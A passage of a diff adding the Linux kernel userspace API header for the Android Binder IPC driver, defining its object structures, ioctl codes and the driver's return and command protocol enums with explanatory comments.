+ * @pad_binder:	padding to remain compatible with old userspace code
+ * @fd:		file descriptor
+ * @cookie:	opaque data, used by user-space
+ */
+struct binder_fd_object {
+	struct binder_object_header	hdr;
+	__u32				pad_flags;
+	union {
+		binder_uintptr_t	pad_binder;
+		__u32			fd;
+	};
+
+	binder_uintptr_t		cookie;
+};
+
+/* struct binder_buffer_object - object describing a userspace buffer
+ * @hdr:		common header structure
+ * @flags:		one or more BINDER_BUFFER_* flags
+ * @buffer:		address of the buffer
+ * @length:		length of the buffer
+ * @parent:		index in offset array pointing to parent buffer
+ * @parent_offset:	offset in @parent pointing to this buffer
+ *
+ * A binder_buffer object represents an object that the
+ * binder kernel driver can copy verbatim to the target
+ * address space. A buffer itself may be pointed to from
+ * within another buffer, meaning that the pointer inside
+ * that other buffer needs to be fixed up as well. This
+ * can be done by setting the BINDER_BUFFER_FLAG_HAS_PARENT
+ * flag in @flags, by setting @parent buffer to the index
+ * in the offset array pointing to the parent binder_buffer_object,
+ * and by setting @parent_offset to the offset in the parent buffer
+ * at which the pointer to this buffer is located.
+ */
+struct binder_buffer_object {
+	struct binder_object_header	hdr;
+	__u32				flags;
+	binder_uintptr_t		buffer;
+	binder_size_t			length;
+	binder_size_t			parent;
+	binder_size_t			parent_offset;
+};
+
+enum {
+	BINDER_BUFFER_FLAG_HAS_PARENT = 0x01,
+};
+
+/* struct binder_fd_array_object - object describing an array of fds in a buffer
+ * @hdr:		common header structure
+ * @pad:		padding to ensure correct alignment
+ * @num_fds:		number of file descriptors in the buffer
+ * @parent:		index in offset array to buffer holding the fd array
+ * @parent_offset:	start offset of fd array in the buffer
+ *
+ * A binder_fd_array object represents an array of file
+ * descriptors embedded in a binder_buffer_object. It is
+ * different from a regular binder_buffer_object because it
+ * describes a list of file descriptors to fix up, not an opaque
+ * blob of memory, and hence the kernel needs to treat it differently.
+ *
+ * An example of how this would be used is with Android's
+ * native_handle_t object, which is a struct with a list of integers
+ * and a list of file descriptors. The native_handle_t struct itself
+ * will be represented by a struct binder_buffer_objct, whereas the
+ * embedded list of file descriptors is represented by a
+ * struct binder_fd_array_object with that binder_buffer_object as
+ * a parent.
+ */
+struct binder_fd_array_object {
+	struct binder_object_header	hdr;
+	__u32				pad;
+	binder_size_t			num_fds;
+	binder_size_t			parent;
+	binder_size_t			parent_offset;
+};
+
+/*
+ * On 64-bit platforms where user code may run in 32-bits the driver must
+ * translate the buffer (and local binder) addresses appropriately.
+ */
+
+struct binder_write_read {
+	binder_size_t		write_size;	/* bytes to write */
+	binder_size_t		write_consumed;	/* bytes consumed by driver */
+	binder_uintptr_t	write_buffer;
+	binder_size_t		read_size;	/* bytes to read */
+	binder_size_t		read_consumed;	/* bytes consumed by driver */
+	binder_uintptr_t	read_buffer;
+};
+
+/* Use with BINDER_VERSION, driver fills in fields. */
+struct binder_version {
+	/* driver protocol version -- increment with incompatible change */
+	__s32       protocol_version;
+};
+
+/* This is the current protocol version. */
+#ifdef BINDER_IPC_32BIT
+#define BINDER_CURRENT_PROTOCOL_VERSION 7
+#else
+#define BINDER_CURRENT_PROTOCOL_VERSION 8
+#endif
+
+/*
+ * Use with BINDER_GET_NODE_DEBUG_INFO, driver reads ptr, writes to all fields.
+ * Set ptr to NULL for the first call to get the info for the first node, and
+ * then repeat the call passing the previously returned value to get the next
+ * nodes.  ptr will be 0 when there are no more nodes.
+ */
+struct binder_node_debug_info {
+	binder_uintptr_t ptr;
+	binder_uintptr_t cookie;
+	__u32            has_strong_ref;
+	__u32            has_weak_ref;
+};
+
+#define BINDER_WRITE_READ		_IOWR('b', 1, struct binder_write_read)
+#define BINDER_SET_IDLE_TIMEOUT		_IOW('b', 3, __s64)
+#define BINDER_SET_MAX_THREADS		_IOW('b', 5, __u32)
+#define BINDER_SET_IDLE_PRIORITY	_IOW('b', 6, __s32)
+#define BINDER_SET_CONTEXT_MGR		_IOW('b', 7, __s32)
+#define BINDER_THREAD_EXIT		_IOW('b', 8, __s32)
+#define BINDER_VERSION			_IOWR('b', 9, struct binder_version)
+#define BINDER_GET_NODE_DEBUG_INFO	_IOWR('b', 11, struct binder_node_debug_info)
+
+/*
+ * NOTE: Two special error codes you should check for when calling
+ * in to the driver are:
+ *
+ * EINTR -- The operation has been interupted.  This should be
+ * handled by retrying the ioctl() until a different error code
+ * is returned.
+ *
+ * ECONNREFUSED -- The driver is no longer accepting operations
+ * from your process.  That is, the process is being destroyed.
+ * You should handle this by exiting from your process.  Note
+ * that once this error code is returned, all further calls to
+ * the driver from any thread will return this same code.
+ */
+
+enum transaction_flags {
+	TF_ONE_WAY	= 0x01,	/* this is a one-way call: async, no return */
+	TF_ROOT_OBJECT	= 0x04,	/* contents are the component's root object */
+	TF_STATUS_CODE	= 0x08,	/* contents are a 32-bit status code */
+	TF_ACCEPT_FDS	= 0x10,	/* allow replies with file descriptors */
+};
+
+struct binder_transaction_data {
+	/* The first two are only used for bcTRANSACTION and brTRANSACTION,
+	 * identifying the target and contents of the transaction.
+	 */
+	union {
+		/* target descriptor of command transaction */
+		__u32	handle;
+		/* target descriptor of return transaction */
+		binder_uintptr_t ptr;
+	} target;
+	binder_uintptr_t	cookie;	/* target object cookie */
+	__u32		code;		/* transaction command */
+
+	/* General information about the transaction. */
+	__u32	        flags;
+	pid_t		sender_pid;
+	uid_t		sender_euid;
+	binder_size_t	data_size;	/* number of bytes of data */
+	binder_size_t	offsets_size;	/* number of bytes of offsets */
+
+	/* If this transaction is inline, the data immediately
+	 * follows here; otherwise, it ends with a pointer to
+	 * the data buffer.
+	 */
+	union {
+		struct {
+			/* transaction data */
+			binder_uintptr_t	buffer;
+			/* offsets from buffer to flat_binder_object structs */
+			binder_uintptr_t	offsets;
+		} ptr;
+		__u8	buf[8];
+	} data;
+};
+
+struct binder_transaction_data_sg {
+	struct binder_transaction_data transaction_data;
+	binder_size_t buffers_size;
+};
+
+struct binder_ptr_cookie {
+	binder_uintptr_t ptr;
+	binder_uintptr_t cookie;
+};
+
+struct binder_handle_cookie {
+	__u32 handle;
+	binder_uintptr_t cookie;
+} __packed;
+
+struct binder_pri_desc {
+	__s32 priority;
+	__u32 desc;
+};
+
+struct binder_pri_ptr_cookie {
+	__s32 priority;
+	binder_uintptr_t ptr;
+	binder_uintptr_t cookie;
+};
+
+enum binder_driver_return_protocol {
+	BR_ERROR = _IOR('r', 0, __s32),
+	/*
+	 * int: error code
+	 */
+
+	BR_OK = _IO('r', 1),
+	/* No parameters! */
+
+	BR_TRANSACTION = _IOR('r', 2, struct binder_transaction_data),
+	BR_REPLY = _IOR('r', 3, struct binder_transaction_data),
+	/*
+	 * binder_transaction_data: the received command.
+	 */
+
+	BR_ACQUIRE_RESULT = _IOR('r', 4, __s32),
+	/*
+	 * not currently supported
+	 * int: 0 if the last bcATTEMPT_ACQUIRE was not successful.
+	 * Else the remote object has acquired a primary reference.
+	 */
+
+	BR_DEAD_REPLY = _IO('r', 5),
+	/*
+	 * The target of the last transaction (either a bcTRANSACTION or
+	 * a bcATTEMPT_ACQUIRE) is no longer with us.  No parameters.
+	 */
+
+	BR_TRANSACTION_COMPLETE = _IO('r', 6),
+	/*
+	 * No parameters... always refers to the last transaction requested
+	 * (including replies).  Note that this will be sent even for
+	 * asynchronous transactions.
+	 */
+
+	BR_INCREFS = _IOR('r', 7, struct binder_ptr_cookie),
+	BR_ACQUIRE = _IOR('r', 8, struct binder_ptr_cookie),
+	BR_RELEASE = _IOR('r', 9, struct binder_ptr_cookie),
+	BR_DECREFS = _IOR('r', 10, struct binder_ptr_cookie),
+	/*
+	 * void *:	ptr to binder
+	 * void *: cookie for binder
+	 */
+
+	BR_ATTEMPT_ACQUIRE = _IOR('r', 11, struct binder_pri_ptr_cookie),
+	/*
+	 * not currently supported
+	 * int:	priority
+	 * void *: ptr to binder
+	 * void *: cookie for binder
+	 */
+
+	BR_NOOP = _IO('r', 12),
+	/*
+	 * No parameters.  Do nothing and examine the next command.  It exists
+	 * primarily so that we can replace it with a BR_SPAWN_LOOPER command.
+	 */
+
+	BR_SPAWN_LOOPER = _IO('r', 13),
+	/*
+	 * No parameters.  The driver has determined that a process has no
+	 * threads waiting to service incoming transactions.  When a process
+	 * receives this command, it must spawn a new service thread and
+	 * register it via bcENTER_LOOPER.
+	 */
+
+	BR_FINISHED = _IO('r', 14),
+	/*
+	 * not currently supported
+	 * stop threadpool thread
+	 */
+
+	BR_DEAD_BINDER = _IOR('r', 15, binder_uintptr_t),
+	/*
+	 * void *: cookie
+	 */
+	BR_CLEAR_DEATH_NOTIFICATION_DONE = _IOR('r', 16, binder_uintptr_t),
+	/*
+	 * void *: cookie
+	 */
+
+	BR_FAILED_REPLY = _IO('r', 17),
+	/*
+	 * The the last transaction (either a bcTRANSACTION or
+	 * a bcATTEMPT_ACQUIRE) failed (e.g. out of memory).  No parameters.
+	 */
+};
+
+enum binder_driver_command_protocol {
+	BC_TRANSACTION = _IOW('c', 0, struct binder_transaction_data),
+	BC_REPLY = _IOW('c', 1, struct binder_transaction_data),
+	/*
+	 * binder_transaction_data: the sent command.
+	 */
+
+	BC_ACQUIRE_RESULT = _IOW('c', 2, __s32),
+	/*
+	 * not currently supported
+	 * int:  0 if the last BR_ATTEMPT_ACQUIRE was not successful.
+	 * Else you have acquired a primary reference on the object.
+	 */
+
+	BC_FREE_BUFFER = _IOW('c', 3, binder_uintptr_t),
+	/*
+	 * void *: ptr to transaction data received on a read
+	 */
+
+	BC_INCREFS = _IOW('c', 4, __u32),
+	BC_ACQUIRE = _IOW('c', 5, __u32),
+	BC_RELEASE = _IOW('c', 6, __u32),
+	BC_DECREFS = _IOW('c', 7, __u32),
+	/*
+	 * int:	descriptor
+	 */
+
+	BC_INCREFS_DONE = _IOW('c', 8, struct binder_ptr_cookie),
+	BC_ACQUIRE_DONE = _IOW('c', 9, struct binder_ptr_cookie),
+	/*
+	 * void *: ptr to binder
+	 * void *: cookie for binder
+	 */
+
+	BC_ATTEMPT_ACQUIRE = _IOW('c', 10, struct binder_pri_desc),
+	/*
+	 * not currently supported
+	 * int: priority
+	 * int: descriptor
+	 */
+
+	BC_REGISTER_LOOPER = _IO('c', 11),
+	/*
+	 * No parameters.
+	 * Register a spawned looper thread with the device.
+	 */
+
+	BC_ENTER_LOOPER = _IO('c', 12),
+	BC_EXIT_LOOPER = _IO('c', 13),
+	/*
+	 * No parameters.
+	 * These two commands are sent as an application-level thread
+	 * enters and exits the binder loop, respectively.  They are
+	 * used so the binder can have an accurate count of the number
+	 * of looping threads it has available.
+	 */
+
+	BC_REQUEST_DEATH_NOTIFICATION = _IOW('c', 14,
+						struct binder_handle_cookie),
+	/*
+	 * int: handle
+	 * void *: cookie
+	 */
+
+	BC_CLEAR_DEATH_NOTIFICATION = _IOW('c', 15,
+						struct binder_handle_cookie),
+	/*
+	 * int: handle
+	 * void *: cookie
+	 */
+
+	BC_DEAD_BINDER_DONE = _IOW('c', 16, binder_uintptr_t),
+	/*
+	 * void *: cookie
+	 */
+
+	BC_TRANSACTION_SG = _IOW('c', 17, struct binder_transaction_data_sg),
+	BC_REPLY_SG = _IOW('c', 18, struct binder_transaction_data_sg),
+	/*
+	 * binder_transaction_data_sg: the sent command.
+	 */
+};
+
+#endif /* _UAPI_LINUX_BINDER_H */
+
